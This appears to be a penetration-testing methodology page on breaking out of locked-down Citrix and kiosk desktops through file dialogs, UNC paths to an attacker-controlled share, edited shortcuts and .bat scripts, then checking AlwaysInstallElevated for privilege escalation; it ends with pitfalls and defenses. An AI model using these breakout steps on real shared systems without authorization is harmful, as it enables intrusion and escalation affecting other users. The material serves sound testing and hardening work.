---
layout: page
title: "Citrix and Kiosk Breakout"
subtitle: "Escape a locked-down desktop through dialog boxes, shortcuts and alternative file tools, then escalate"
permalink: /methodology/privesc-windows/citrix-breakout/
---

Locked-down desktops, such as those delivered through Citrix, kiosks and shared terminals, use Group Policy to block Explorer browsing, the command prompt and PowerShell. The restrictions are often thin. Most desktop applications still expose file dialogs for Open, Save and Save As, and those dialogs can browse the file system. From there, a user can reach executable content, an SMB share, or a shell. The notes describe a basic three-stage method: reach a dialog, use it for command execution, then escalate privileges.

## Step 1: Map the restrictions

Check what is blocked before trying anything:

1. Try to open a restricted folder, such as `C:\Users`, in Explorer. A policy error confirms a folder restriction.
2. Try to run `cmd.exe`, `powershell.exe` and the registry editor from the Start menu and the Run dialog.
3. Note which applications are available. Paint, WordPad and line-of-business applications all tend to offer file dialogs.

## Step 2: Use an application file dialog

In an application that offers Open, enter a path in the File name field and set the file type filter to All Files. A UNC path to a local administrative share or to a network share can then be browsed through the dialog.

```text
\\127.0.0.1\c$\Users
\\<attacker IP>\share
```

The path that works depends on the policy. Test local and network paths separately, and record which ones the policy blocks.

## Step 3: Reach an executable

A dialog that can reach a share gives a route to an executable. Right-click a file in the dialog and choose Open. Where the file is a program that opens a console, the console runs in the restricted session. The notes describe a small compiled program that starts `cmd.exe` as its only action, stored on a share the tester controls.

Other routes described in the notes:

- Alternative file managers, such as Explorer++ or Q-Dir, which may not enforce the folder restriction.
- Alternative registry editors, when the standard editor is blocked.
- Editing the Target field of an existing shortcut to point at `cmd.exe` or at a folder outside the restriction, then running the shortcut.
- Creating a script with a `.bat` extension that opens a console when it runs, where script extensions are associated with their interpreters.

## Step 4: Escalate privileges

Once a shell exists, use the standard local checks. The notes describe a case where a tool reports AlwaysInstallElevated enabled. The registry values can be checked directly:

```cmd
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

A value of `0x1` in both hives means the policy is set. The Miscellaneous Techniques page covers this in detail. When the user is an administrator but the UAC consent prompt still blocks administrative folders, the UAC Bypass page covers the options.

## What to look for

- Dialogs in desktop applications that accept UNC paths or browse outside the user's profile.
- Shortcuts, scripts or executables that the user can create or modify.
- Alternative tools that remain available after the blocked tools are removed.
- Standard local privilege escalation conditions once a shell exists.

## Pitfalls

- Executing content from a share can be blocked by AppLocker or WDAC. Check the policy before dropping files.
- Writing to user profile folders can trigger endpoint alerts, so keep the number of artifacts small.
- Some kiosks reset the profile at logoff. Record the artifacts so they can be removed before the session ends.
- Test only inside the agreed scope, since breaking out of a shared environment can affect other users.

## Defense

Restrict file dialogs in applications that do not need them, and block UNC paths to administrative shares from user sessions. Apply AppLocker or WDAC to block unknown executables and scripts in user profiles. Block alternative file managers and registry editors that are not required. Remove the write permissions users do not need for shortcuts and scripts, and use a kiosk or assigned-access configuration where a single application is enough.
